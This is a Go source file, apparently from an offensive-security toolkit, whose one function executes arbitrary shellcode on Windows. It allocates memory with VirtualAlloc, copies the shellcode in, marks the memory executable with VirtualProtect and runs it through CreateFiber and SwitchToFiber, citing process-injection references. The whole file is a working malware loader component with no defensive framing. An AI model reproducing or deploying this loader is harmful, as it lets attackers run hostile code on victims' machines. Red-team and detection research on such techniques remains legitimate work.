package shellcode

/*

References:
https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateFiber/main.go

*/

import (
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

func Fibers(shellcode []byte) error {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, _ := ConvertThreadToFiber.Call() // Convert thread to fiber

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	fiber, _, _ := CreateFiber.Call(0, addr, 0)

  SwitchToFiber.Call(fiber)

  SwitchToFiber.Call(fiberAddr)

	return nil
}
